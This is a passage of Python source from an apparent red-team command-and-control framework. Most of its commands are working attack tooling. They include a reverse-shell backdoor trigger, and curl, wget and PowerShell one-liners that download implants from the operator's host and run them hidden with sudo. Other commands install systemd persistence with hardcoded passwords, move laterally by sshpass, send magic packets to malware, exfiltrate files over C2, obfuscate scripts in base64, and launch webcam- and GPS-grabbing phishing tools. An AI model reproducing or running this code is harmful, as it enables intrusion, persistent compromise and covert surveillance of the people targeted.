        if os.path.isfile(os.path.join(session_path, "index.html")):
            print_msg("Site cloned successfully.")

    @cmd2.with_category(persistence_category)
    def do_knokknok(self, line):
        """Send special string to trigger a reverse shell, with the command 'c2 client_name'
        create a listener shell script to drop the reverse shell in python3
        Args:
            line (str): input line not used

        Returns:
            None
        """
        HOST = self.params["rhost"]
        if line:
            PORT = line.strip()
        else:
            PORT = self.params["rport"]
        print_msg(f"KnokKnok backdoor on {HOST} {PORT}")
        especial_cadena = "grisiscomebacksayknokknok"
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, int(PORT)))
            client_socket.sendall(especial_cadena.encode('utf-8'))
            client_socket.close()
            print_msg("Who is ?")
        except Exception:
            print_error("Listener is not listen.")
        return

    @cmd2.with_category(persistence_category)
    def do_listener_go(self, line):
        """
        Configures and starts a listener for a specified victim.

        This function takes a command line input to configure and start a listener for a specified victim.
        The input should include the victim ID, the choice of listener type, and optionally the port numbers.
        The function then constructs the appropriate command to start the listener and assigns the necessary
        parameters.

        Args:
            line (str): The command line input containing the victim ID, listener type, and optional port numbers.

        Returns:
            None

        Raises:
            None

        Example:
            >>> listener_go victim1 2 1337 7777
        """
        if line:
            args = line.split()

            if len(args) == 1:
                line = args[0]
                choice = None
                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
                return
            elif len(args) == 2:
                line = args[0]
                choice = args[1]
                port = '6666'
                listener = '7777'
            elif len(args) == 3:
                line = args[0]
                choice = args[1]
                port =  args[2]
                listener = '7777'
            elif len(args) == 4:
                line = args[0]
                choice = args[1]
                port =  args[2]
                listener = args[3]
            else:
                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
                return
        else:
            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
            return

        lhost = self.params["lhost"]
        implant_go2 = f"l_{line}_l.exe"
        if choice == "2":
            command = f"curl -o /home/grisun0/l_{line} http://{lhost}/l_{line} && sudo -S chmod +x /home/grisun0/l_{line} && sudo -S nohup /home/grisun0/l_{line} & \\n"
        else:
            command = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\""

        self.onecmd(f'assign rport {port}')
        self.onecmd(f'assign lport {port}')
        self.onecmd(f'assign listener {listener}')
        self.onecmd(f'c2 {line} {choice}')
        self.onecmd(f'ssh_cmd {command}')
        self.onecmd(f'nc {listener}')
        return

    @cmd2.with_category(persistence_category)
    def do_listener_py(self, line):
        """
        Configures and starts a listener for a specified victim.

        This function takes a command line input to configure and start a listener for a specified victim.
        The input should include the victim ID, the choice of listener type, and optionally the port numbers.
        The function then constructs the appropriate command to start the listener and assigns the necessary
        parameters.

        Args:
            line (str): The command line input containing the victim ID, listener type, and optional port numbers.

        Returns:
            None

        Raises:
            None

        Example:
            >>> listener_py victim1 2 1337 7777
        """
        if line:
            args = line.split()

            if len(args) == 1:
                line = args[0]
                choice = None
                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
                return
            elif len(args) == 2:
                line = args[0]
                choice = args[1]
                port = '6666'
                listener = '7777'
            elif len(args) == 3:
                line = args[0]
                choice = args[1]
                port =  args[2]
                listener = '7777'
            elif len(args) == 4:
                line = args[0]
                choice = args[1]
                port =  args[2]
                listener = args[3]
            else:
                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
                return
        else:
            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
            return

        lhost = self.params["lhost"]

        if choice == "2":
            command = f"curl -o /home/.grisun0/l_{line}.sh http://{lhost}/listener_{line}.sh && sudo -S chmod +x /home/.grisun0/l_{line}.sh && sudo -S nohup /bin/bash /home/.grisun0/l_{line}.sh & \\n"
        else:
            command = f"Start-Process powershell -ArgumentList \"curl -o l_{line}.sh http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &\""

        self.onecmd(f'assign rport {port}')
        self.onecmd(f'assign lport {port}')
        self.onecmd(f'assign listener {listener}')
        self.onecmd(f'c2 {line} {choice}')
        self.onecmd(f'ssh_cmd {command}')
        self.onecmd(f'nc {listener}')
        return

    @cmd2.with_category(recon_category)
    def do_ipinfo(self, line):
        """
        Retrieves detailed information about an IP address using the ARIN API.

        This function takes an IP address as input, queries the ARIN API to get detailed
        information about the IP, and then displays the organization name and the network
        range associated with the IP.

        Args:
            line (str): The command line input containing the IP address to query.

        Returns:
            None

        Raises:
            None

        Example:
            >>> ipinfo 1.1.1.1
        """
        ip = line.strip()
        if not ip:
            print_error("Error: Por favor, proporciona una dirección IP.")
            return

        data = query_arin_ip(ip)
        if not data:
            print_error(f"No se encontró información para la IP: {ip}")
            return

        if not data.get("net"):
            print_error(f"Formato de respuesta inesperado de la API de ARIN para la IP: {ip}")
            return

        name = get_org(data)
        try:
            net_blocks = data.get("net", {}).get("netBlocks", [])
            if net_blocks:
                netblock = net_blocks[0].get("netBlock", {})
                start_address = netblock.get("$", {}).get("startAddress")
                cidr_length = netblock.get("$", {}).get("cidrLength")

                if start_address and cidr_length:
                    range = f"{start_address}/{cidr_length}"
                else:
                    range = "N/A (Error incomplete info)"
            else:
                range = "N/A (No network blocks)"
        except (KeyError, AttributeError, IndexError) as e:
            print_warn(f"Error IP: {ip}. Error code: {e}")
            range = "N/A (Error)"

        print_msg(f"[!] {ip}")
        print_msg(f" |_ {name}")
        print_msg(f" \_ {range}")
        return

    @cmd2.with_category(post_exploitation_category)
    def do_service_ssh(self, line):
        """
        Creates a systemd service file for a specified binary and generates a script to enable and start the service.

        This function takes the name of a binary as input, creates a systemd service file for it, and generates a shell script
        to enable and start the service. The script is saved in the sessions directory and a command is provided to execute
        the script remotely via SSH.

        Args:
            line (str): The command line input containing the name of the binary. If an absolute path is not provided,
                        a default path is used.

        Returns:
            None

        Raises:
            None

        Example:
            >>> service my_binary_name
        """
        binary_name = line.strip()
        lhost = self.params["lhost"]
        if not binary_name:
            print_error("No binary name provided.")
            return

        default_path = f"/home/.grisun0/services/{binary_name}"
        binary_path = default_path if not os.path.isabs(binary_name) else binary_name

        service_content = f"""#!/bin/bash
        SOURCE_FILE="{line}.service"
        cat > $SOURCE_FILE <<EOL
        [Unit]
        Description=My Custom Service for {binary_name}
        After=network.target

        [Service]
        ExecStart={binary_path}
        WorkingDirectory=/home/.grisun0/services
        StandardOutput=inherit
        StandardError=inherit
        Restart=always
        User=nobody

        [Install]
        WantedBy=multi-user.target
        EOL
        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service &&
        sudo systemctl daemon-reload &&
        sudo systemctl start {binary_name} &&
        sudo systemctl enable {binary_name}
        """.replace('        ','')

        service_file_path = os.path.join(self.sessions_dir, f"{binary_name}_service.sh")

        try:
            with open(service_file_path, "w") as service_file:
                service_file.write(service_content)
            print_msg(f"Service file created at {service_file_path}")
        except Exception as e:
            print_error(f"Failed to create service file: {e}")
            return

        password = 'grisgrisgris'
        cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
        print_msg(f"Run the following command to enable and start the service:")
        self.onecmd(f"ssh_cmd {cmd}")

    @cmd2.with_category(persistence_category)
    def do_service(self, line):
        """
        Creates a systemd service file for a specified binary and generates a script to enable and start the service.

        This function takes the name of a binary as input, creates a systemd service file for it, and generates a shell script
        to enable and start the service. The script is saved in the sessions directory and a command is provided to execute
        the script remotely via SSH.

        Args:
            line (str): The command line input containing the name of the binary. If an absolute path is not provided,
                        a default path is used.

        Returns:
            None

        Raises:
            None

        Example:
            >>> service my_binary_name
        """
        binary_name = line.strip()
        lhost = self.params["lhost"]
        if not binary_name:
            print_error("No binary name provided.")
            return

        default_path = f"/home/.grisun0/services/{binary_name}"
        binary_path = default_path if not os.path.isabs(binary_name) else binary_name

        service_content = f"""#!/bin/bash
        SOURCE_FILE="{line}.service"
        cat > $SOURCE_FILE <<EOL
        [Unit]
        Description=My Custom Service for {binary_name}
        After=network.target

        [Service]
        ExecStart={binary_path}
        WorkingDirectory=/home/.grisun0/services
        StandardOutput=inherit
        StandardError=inherit
        Restart=always
        User=nobody

        [Install]
        WantedBy=multi-user.target
        EOL
        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service &&
        sudo systemctl daemon-reload &&
        sudo systemctl start {binary_name} &&
        sudo systemctl enable {binary_name}
        """.replace('        ','')

        service_file_path = os.path.join(self.sessions_dir, f"{binary_name}_service.sh")

        try:
            with open(service_file_path, "w") as service_file:
                service_file.write(service_content)
            print_msg(f"Service file created at {service_file_path}")
        except Exception as e:
            print_error(f"Failed to create service file: {e}")
            return

        password = 'grisgrisgris'
        cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
        print_msg(f"Run the following command to enable and start the service: {cmd}")

    @cmd2.with_category(persistence_category)
    def do_toctoc(self, line):
        """
        Sends a magic packet to the Chinese malware.
        The function extracts rhost and rport from self.params["rhost"] and self.params["rport"], respectively.
        """
        rhost = self.params.get("rhost")
        rport = self.params.get("rport")

        if not rhost or not rport:
            raise ValueError("rhost and rport must be specified in params")

        try:
            rport = int(rport)
        except ValueError:
            raise ValueError("rport must be an integer")

        magic_packet = struct.pack('!I4sH14s', 0xDEADBEEF, socket.inet_aton(rhost), rport, b'justforfun')
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(magic_packet, (rhost, rport))

        print(f"Magic packet sent to {rhost}:{rport}")

    @cmd2.with_category(exfiltration_category)
    def do_download_c2(self, line):
        """
        Download a file from the command and control (C2) server.

        This function handles the downloading of a file from the C2 server. It requires the remote path of the file to be specified in the input line. If the input line is empty, it prints an error message and returns.

        Args:
            line (str): The input line containing the remote path of the file to download. If empty, the function will print an error message.

        Returns:
            None
        """
        if not line:
            print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
            return
        self.download_file_from_c2(line)
        return

    @cmd2.with_category(reporting_category)
    def do_groq(self, line):
        """
        Execute a command to interact with the GROQ API using the provided API key.

        This function takes an optional input line that is used as the prompt. If no input line is
        provided, the default prompt stored in the instance is used. The function sets the GROQ_API_KEY
        environment variable and runs a Python script to interact with the GROQ API.

        Parameters:
            line (str): The input line to be used as the prompt. If not provided, the default prompt is used.

        Returns:
            None
        """
        api_key = self.params["api_key"]
        if not line:
            prompt = self.prompt
        else:
            prompt = line.strip()
        print_msg(f"Executing... python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
        os.system(f"export GROQ_API_KEY=\"{api_key}\" && python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
        return

    @cmd2.with_category(reporting_category)
    def do_c2asm(self, arg):
        """
        Display C and ASM code side by side in a curses-based interface.

        This function sets up a curses window to display C code and its corresponding
        assembly code side by side. It allows the user to select a .c file from the
        'sessions' directory and then displays the code with scrolling capabilities
        both vertically and horizontally. A green vertical line separates the C code
        from the ASM code.

        Parameters:
            stdscr (curses.window): The curses window object to draw on.

        Returns:
            None
        """
        curses.wrapper(self.view_code)

    def view_code(self, stdscr):
        """
        Display C and ASM code side by side in a curses-based interface.

        This function sets up a curses window to display C code and its corresponding
        assembly code side by side. It allows the user to select a .c file from the
        'sessions' directory and then displays the code with scrolling capabilities
        both vertically and horizontally. A green vertical line separates the C code
        from the ASM code.

        Parameters:
            stdscr (curses.window): The curses window object to draw on.

        Returns:
            None
        """
        curses.curs_set(0)
        stdscr.refresh()
        stdscr.clear()
        stdscr.nodelay(1)
        stdscr.timeout(100)


        path = os.path.join(os.getcwd(), 'sessions')
        c_files = [f for f in os.listdir(path) if f.endswith('.c')]

        if not c_files:
            stdscr.addstr(0, 0, "No .c files found in 'sessions/' directory.")
            stdscr.refresh()
            stdscr.getch()
            return

        stdscr.addstr(0, 0, "Available .c files:")
        for i, file in enumerate(c_files):
            stdscr.addstr(i + 1, 0, f"    {i + 1}. {file}")
        stdscr.refresh()


        selected_file = None
        while not selected_file:
            stdscr.addstr(len(c_files) + 2, 0, "Choose a file by number (1-{}): ".format(len(c_files)))
            stdscr.refresh()
            key = stdscr.getch()
            if key == 27:
                return
            try:
                choice = int(chr(key))
                if 1 <= choice <= len(c_files):
                    selected_file = c_files[choice - 1]
            except ValueError:
                stdscr.addstr(len(c_files) + 3, 0, "Invalid input. Please enter a number.")
                stdscr.refresh()
                stdscr.getch()

        code_c = os.path.join(path, selected_file)
        code_asm = code_c.replace(".c", ".asm")
        os.system(f"gcc -S -o {code_asm} {code_c}")

        with open(code_c, 'r') as f:
            c_code = f.readlines()
        with open(code_asm, 'r') as f:
            asm_code = f.readlines()


        selected_line = 0
        max_lines = max(len(c_code), len(asm_code))
        top_line = 0

        while True:
            stdscr.clear()


            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                if i < len(c_code):
                    line = c_code[i].rstrip()
                    try:
                        if i == selected_line:
                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1], curses.A_REVERSE)
                        else:
                            stdscr.addstr(i - top_line, 0, line[:stdscr.getmaxyx()[1] - 1])
                    except curses.error:
                        pass


            for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                if i < len(asm_code):
                    line = asm_code[i].rstrip()
                    try:
                        if i == selected_line:
                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41], curses.A_REVERSE)
                        else:
                            stdscr.addstr(i - top_line, 40, line[:stdscr.getmaxyx()[1] - 41])
                    except curses.error:
                        pass

            stdscr.refresh()


            key = stdscr.getch()
            if key == curses.KEY_UP and selected_line > 0:
                selected_line -= 1
                if selected_line < top_line:
                    top_line -= 1
            elif key == curses.KEY_DOWN and selected_line < max_lines - 1:
                selected_line += 1
                if selected_line >= top_line + stdscr.getmaxyx()[0]:
                    top_line += 1
            elif key == 27:
                break

    @cmd2.with_category(reporting_category)
    def do_camphish(self, line):
        """
        Executes the camphish tool for Grab cam shots from target's phone front camera or PC webcam just sending a link.

        This function:
            - Installs camphish if not already installed.
            - Executes the camphish command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `git` and `php` to be installed.
            - Uses a one-liner installation method for simplicity.

        Usage:
            camphish
        """
        path = os.getcwd()
        camphish_repo = "https://github.com/techchipnet/CamPhish.git"
        camphish_path = os.path.join(path, "external", ".exploit", "CamPhish")

        try:
            if not os.path.exists(camphish_path):
                print_msg("CamPhish is not installed. Installing...")
                self.cmd(f"git clone {camphish_repo} {camphish_path}")
                self.cmd(f"cd {camphish_path} && chmod +x camphish.sh")

            command = f"cd {camphish_path} && ./camphish.sh"
            self.cmd(command)

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(scanning_category)
    def do_hound(self, line):
        """
        Executes the hound tool for Hound is a simple and light tool for information gathering and capture exact GPS coordinates

        This function:
            - Installs hound if not already installed.
            - Executes the hound command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `git` and `php` to be installed.
            - Uses a one-liner installation method for simplicity.

        Usage:
            hound
        """
        path = os.getcwd()
        hound_repo = "https://github.com/techchipnet/hound.git"
        hound_path = os.path.join(path, "external", ".exploit", "hound")

        try:
            if not os.path.exists(hound_path):
                print_msg("hound is not installed. Installing...")
                self.cmd(f"git clone {hound_repo} {hound_path}")
                self.cmd(f"cd {hound_path} && chmod +x hound.sh")

            command = f"cd {hound_path} && ./hound.sh"
            self.cmd(command)

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_ofuscatesh(self, line):
        """
        Obfuscates a shell script by encoding it in Base64 and prepares a command to decode and execute it.

        This function reads the content of a shell script file, encodes it in Base64, and constructs a command
        that can be used to decode and execute the encoded script using `echo` and `base64 -d`.

        Args:
            line (str): The path to the shell script file to be obfuscated. If not provided, a default
                        path is obtained from the `get_users_dic` function.

        Returns:
            None

        Example:
            >>> ofuscatesh /path/to/script.sh or just ofuscatesh
            # This will read the script, encode it in Base64, and prepare a command to decode and execute it.
        """
        if not line:
            line = get_users_dic('sh')

        with open(line, 'r') as f:
            content = f.read().strip()

        utf8_encoded = content.encode("utf-8")
        base64_encoded = base64.b64encode(utf8_encoded).decode('utf-8')
        cmd = f"echo '{base64_encoded}' | base64 -d | bash"
        copy2clip(cmd)

    @cmd2.with_category(miscellaneous_category)
    def do_load_session(self, line):
        """
        Load the session from the sessionLazyOwn.json file and display the status of various parameters.

        This command reads the sessionLazyOwn.json file from the sessions directory and displays the status
        of parameters, credentials, hashes, notes, plan, id_rsa, implants, and redop.

        :param line: Additional arguments (not used in this command)
        """
        session_file_path = os.path.join('sessions', 'sessionLazyOwn.json')

        try:
            with open(session_file_path, 'r') as file:
                session_data = json.load(file)

            params_count = len(session_data.get('params', {}))
            credentials_count = len(session_data.get('credentials', []))
            hashes_count = len(session_data.get('hashes', []))
            notes_status = 'LOADED' if 'notes' in session_data else 'NOT LOADED'
            plan_status = 'LOADED' if 'plan' in session_data else 'NOT LOADED'
            id_rsa_count = len(session_data.get('id_rsa', []))
            implants_count = len(session_data.get('implants', []))
            redop_status = 'LOADED' if 'redop' in session_data else 'NOT LOADED'

            timestamp = session_data.get('timestamp', '')

            if timestamp:
                dt_object = datetime.strptime(timestamp, '%Y%m%d%H%M%S')
                formatted_date_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
            else:
                formatted_date_time = 'N/A'

            print_msg(f"N° Params {params_count} [LOADED][OK]")
            print_msg(f"N° Credentials {credentials_count} [LOADED][OK]")
            print_msg(f"N° Hashes {hashes_count} [LOADED][OK]")
            print_msg(f"N° Id_rsa {id_rsa_count} [LOADED][OK]")
            print_msg(f"N° Implants {implants_count} [LOADED][OK]")
            print_msg(f"Notes [{notes_status}][OK]")
            print_msg(f"Plan [{plan_status}][OK]")
            print_msg(f"RedTeam operation [{redop_status}][OK]")
            print_msg(f"Start Operation: {formatted_date_time}")


        except FileNotFoundError:
            print_error(f"Error: The file {session_file_path} does not exist.")
        except json.JSONDecodeError:
            print_error(f"Error: The file {session_file_path} is not a valid JSON file.")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")

    @cmd2.with_category(lateral_movement_category)
    def do_lateral_mov_lin(self, line):
        """
        Perform lateral movement by downloading and installing LazyOwn on a remote Linux machine.

        This function automates the process of setting up an APT and PIP proxy, downloading the LazyOwn package,
        transferring it to a remote machine, and installing it. The function ensures that all necessary directories
        are created and that the package is correctly installed on the remote machine.

        Parameters:
            line (str): The command line input, which is not used in this function.

        Returns:
            None
        """

        print_error("Downloading LazyOwn" + self.url_download)

        version = self.version.replace("/","-")
        name = f"LazyOwn_CRIMEN.tar.gz"
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        tmp = "/tmp/lazyown_atomic_test"
        self.cmd(f"mkdir -p {tmp}")
        sessions = f"{self.path}/sessions/"
        self.onecmd("apt_proxy remote")
        self.onecmd("pip_proxy remote")
        if not os.path.exists(f"{sessions}/{name}"):
            command = f"cd {sessions} && wget -O {name} --header='Accept: application/gzip' {self.url_download}"
            self.cmd(command)
        command_remote = f"wget -O {name} http://{lhost}/{name}"
        username = "grisun0"
        password = "grisgrisgris"
        ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} '
        mkdir -p {tmp} ;
        cd {tmp} ;
        {command_remote} ;
        if [ ! -s {name} ]; then echo "Error: File is empty"; exit 1; fi ;
        tar -vzxf {name} ;
        echo "{password}" | sudo -S curl http://{lhost}/r -o r ;
        sh r &'
        """
        self.cmd(ssh)
        ssh_install = f"sshpass -p '{password}' ssh {username}@{rhost} 'cd {tmp}/LazyOwn-{version} ; echo \"{password}\" | sudo -S bash install.sh &'"
        self.cmd(ssh_install)
        return

    @cmd2.with_category(exploitation_category)
    def do_commix(self, line):
        """
        Executes the Commix tool for detecting and exploiting command injection vulnerabilities.

        This function:
            - Installs Commix if not already installed.
            - Executes the Commix command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `git` and `python` to be installed.
            - Uses a one-liner installation method for simplicity.

        Usage:
            commix {url} {field} {value}
        """
        path = os.getcwd()
        commix_repo = "https://github.com/commixproject/commix.git"
        commix_path = os.path.join(path, "external", ".exploit", "commix")
        commix_path = path + "/" + commix_path

        try:
            if not os.path.exists(commix_path):
                print_msg("Commix is not installed. Installing...")
                self.cmd(f"git clone {commix_repo} {commix_path}")

            parts = line.split()
            url = parts[0] if len(parts) > 0 else self.params.get('url')
            field = parts[1] if len(parts) > 1 else 'file'
            value = parts[2] if len(parts) > 2 else 'test'

            if not url:
                print_error("URL is required.")
                return

            command = f"python {os.path.join(commix_path, 'commix.py')} -u {url} --data=\"{field}={value}\""
            print_msg(f"Executing: {command}")
            self.cmd(command)

        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(lateral_movement_category)
    def do_addcli(self, line):
        """
        Add a client to execute c2 commands

        Parameters:
            line (str): The command line input, which is not used in this function.

        Returns:
            None
        """
        if not line:
            line = input("    [!] Enter the client_id (default: no_priv): ") or 'no_priv'
        self.c2_clientid = line.strip()

    @cmd2.with_category(post_exploitation_category)
    def do_adversary(self, line):
        """
        LazyOwn RedTeam Adversary Emulator, you can configure your own adversaries in adversary.json

        Parameters:
            line (str): The command line input,
            first argument optional is the id of Adversary,
            the second optional argument is if the adversary run locally (l), remote (r), or doesn't run (n)

        Example: adversary 1 r

        Returns:
            None
        """
        # TODO crear parte que hace upload de la data y la parte que hace exfiltracion de lso datos por ejemplo las banderas de hackthebox
        print(len(line))
        c2_port = self.params["c2_port"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        USER = self.params["c2_user"]
        PASS = self.params["c2_pass"]
        maleable = self.params["c2_maleable_route"]
        path = self.path
        adversaries = load_adversary()

        with open(f"{path}/sessions/key.aes", 'rb') as f:
            AES_KEY = f.read()

        AES_KEY_hex = AES_KEY.hex()
        if not line:
            print("Available adversaries:")
            for adv in adversaries:
                print(f"    [{adv.id}] {adv.name}: {adv.description}")

            id_adversary = input("    [!] Enter the id of the adversary: ")
        else:
            if len(line) == 3:
                args = line.split(" ")
                id_adversary = args[0]
                confirm = args[1]
            elif len(line) == 1:
                confirm = None
                id_adversary = line.strip()

        adversary = next((adv for adv in adversaries if adv.id == int(id_adversary)), None)

        if adversary:
            replacements = {
                "output_path": adversary.output_path,
                "binary": adversary.binary,
                "path_src": adversary.path_src,
                "name": adversary.name,
                "target_path": adversary.target_path,
                "pid": adversary.pid,
                "param": adversary.param,
                "shellcode": adversary.shellcode,
                "lhost": lhost
            }
            command = replace_placeholders(adversary.command, replacements)
            if adversary.encoder == "base64":
                base64_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
                replacements["base64_command"] = base64_command

            if adversary.target_os == 'linux':
                user_agent = self.params["user_agent_lin"]
            elif adversary.target_os == 'windows':
                user_agent = self.params["user_agent_win"]


            compile_command = replace_placeholders(adversary.compile, replacements)
            droper_command = replace_placeholders(adversary.droper, replacements)
            payload = replace_placeholders(adversary.payload, replacements)
            clean_cmd = replace_placeholders(adversary.clean_cmd, replacements)
            copy_command = replace_placeholders(adversary.copy_command, replacements)
            replace_command = replace_placeholders(adversary.replace_command, replacements)
            replace_command = replace_command.replace("[shellcode]","{shellcode}")

            if adversary.id == 5:
                print_warn(f"{path}/{adversary.output_path}/{adversary.name}")
                with open(f"{path}/{adversary.output_path}/{adversary.name}", 'r') as f:
                    content = f.read()
                    content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", adversary.target_os).replace("{sleep}", str(adversary.sleep)).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)

                with open(f"{path}/{adversary.output_path}/{adversary.name}", 'w+') as f:
                    f.write(content)


            print_msg(f"Id: {adversary.id}")
            print_msg(f"Name: {adversary.name}")
            print_msg(f"Description: {adversary.description}")
            print_msg(f"Technique name: {adversary.technique_name}")
            print_msg(f"Target os: {adversary.target_os}")
            print_msg(f"Executer: {adversary.executer}")
            print_msg(f"Lang: {adversary.lang}")
            print_msg(f"Compile Command: {compile_command}")
            print_msg(f"Droper Command: {droper_command}")
            print_msg(f"Plantext Command: {command}")
            print_msg(f"Encoded Command: {base64_command}")
            print_msg(f"Payload Command: {payload}")
            print_msg(f"Clean Command: {clean_cmd}")

            local_stack = [copy_command, replace_command, compile_command]
            remote_stack = [droper_command, payload, clean_cmd]

            for lstack in local_stack:
                self.cmd(lstack)
            if not confirm:
                confirm = input(f"   [?] Do you want to execute the stack: ? l to local, r to remote, or n to no exec (l/r/n): ").strip().lower() or 'n'

            for command in remote_stack:
                if confirm == 'l':
                    print_warn(f"Executing command: {command}")
                    subprocess.run(command + " 2>/dev/null", shell=True)

                    command_clipboard = subprocess.Popen(
                        ['xclip', '-selection', 'clipboard'],
                        stdin=subprocess.PIPE
                    )
                    command_clipboard.communicate(input=command.encode())
                    print_msg(f"Command copied to clipboard: {command}")
                elif confirm == 'r':
                    print_warn(f"Executing command: {command}")
                    user = self.c2_clientid
                    self.issue_command_to_c2(command, user)
                    command_clipboard = subprocess.Popen(
                        ['xclip', '-selection', 'clipboard'],
                        stdin=subprocess.PIPE
                    )
                    command_clipboard.communicate(input=command.encode())
                    print_msg(f"Command copied to clipboard: {command}")
                else:
                    print_warn("Command execution cancelled.")
                    command_clipboard = subprocess.Popen(
                        ['xclip', '-selection', 'clipboard'],
                        stdin=subprocess.PIPE
                    )
                    command_clipboard.communicate(input=command.encode())
                    print_msg(f"Command copied to clipboard: {command}")
                time.sleep(int(adversary.sleep))
        else:
            print(f"No adversary found with id {line}")

    @cmd2.with_category(post_exploitation_category)
    def do_ofuscate_string(self, line):
        """Ofuscate a string into Go code."""

        from rich import print
        from rich.syntax import Syntax

        parser = argparse.ArgumentParser(description="Ofuscate a string into Go code.")
        parser.add_argument('variable_name', type=str, help='The name of the variable in Go code.')
        parser.add_argument('string_to_ofuscate', nargs='+', help='The string to ofuscate.')

        try:
            args = parser.parse_args(line.split())
        except SystemExit:
            variable_name = input("Enter the variable name: ")
            string_to_ofuscate = input("Enter the string to ofuscate: ")
        else:
            variable_name = args.variable_name
            string_to_ofuscate = " ".join(args.string_to_ofuscate)

        ofuscated_string = " + ".join([f"'{char}'" for char in string_to_ofuscate])

        max_line_length = 80
        current_line = f"{variable_name} := "
        current_length = len(current_line)
        go_code_lines = [current_line]

        for part in ofuscated_string.split(" + "):
            if current_length + len(part) + 3 > max_line_length:
                go_code_lines.append("    + " + part)
                current_length = len(part) + 5
            else:
                if len(go_code_lines[-1]) > len(current_line):
                    go_code_lines[-1] += " + " + part
                else:
                    go_code_lines[-1] += part
                current_length += len(part) + 3

        go_code = "\n".join(go_code_lines).replace("''", "' + '")

        print(Syntax(go_code, "go", theme="monokai", line_numbers=True))


    def get_available_actions(self):
        """Devuelve una lista de acciones disponibles usando introspección de cmd2."""
        # Usa get_all_commands() para obtener todos los comandos definidos como do_*
        return self.get_all_commands()

    @cmd2.with_category(reporting_category)
    def do_get_avaible_actions(self, line):
        """Get list de supported acctions."""
        actions = self.get_available_actions()
        print_msg(actions)

    @cmd2.with_category(post_exploitation_category)
    def do_path2hex(self, line: str) -> None:
        """
        Convert a binary path to x64 little-endian hex code for shellcode injection.

        Generates an 8-byte aligned hex string padded with '/' for direct use in
        x64 assembly syscall examples. Output format mimics: 0x68732f2f6e69622f ('/bin/sh').

        License: GPL v3 (https://www.gnu.org/licenses/gpl-3.0.html)

        Args:
            line: Input path (e.g., '/bin/ls')

        Technical Process:
            1. Null-terminate input
            2. Pad with '/' to 8 bytes
            3. Convert to little-endian 64-bit hex
            4. Validate ASCII-only characters

        Examples:
            Input:  '/bin/sh'
            Output: 0x68732f2f6e69622f
        """
        if not line:
            self.poutput("Error: No path provided. Usage: path2hex </path/to/bin>")
            return

        try:
            path = line.encode('ascii') + b'\x00'
            total_len = len(path)
            padded_len = ((total_len + 7) // 8) * 8  # Alinear a múltiplo de 8
            padded = path.ljust(padded_len, b'/')

            chunks = [padded[i:i+8] for i in range(0, padded_len, 8)]
            chunks.reverse()  # Apilar en orden inverso

            asm_code = []
            for chunk in chunks:
                hex_val = '0x' + chunk[::-1].hex()
                asm_code.append(f"mov  rax, {hex_val}")
                asm_code.append("push rax")

            self.poutput("\n".join(asm_code))

        except UnicodeEncodeError:
            self.poutput("Error: Solo caracteres ASCII permitidos")

    @cmd2.with_category(post_exploitation_category)
    def do_hex2shellcode(self, line: str) -> None:
        """
        Convert raw hex payload from msfvenom into NASM-compatible shellcode format.

        Transforms a continuous hex string (e.g., msfvenom output) into a properly formatted
        assembly data section with line-wrapped db directives. Handles byte alignment and
        validation.

        License: GPL v3 (https://www.gnu.org/licenses/gpl-3.0.html)

        Args:
            line: Raw hex string from msfvenom (e.g., "4831c94881e9f6...")

        Technical Process:
            1. Validate hex format and remove non-hex characters
            2. Split into byte pairs (xx) -> 0xXX format
            3. Wrap into db lines (16 bytes per line)
            4. Generate length calculation via shellcode_len

        Examples:
            Input: 4831c94881e9f6
            Output:
                db 0x48,0x31,0xc9,0x48,0x81,0xe9,0xf6
        """
        if not line:
            self.poutput("Error: No hex input. Usage: hex2shellcode <HEX_STRING>")
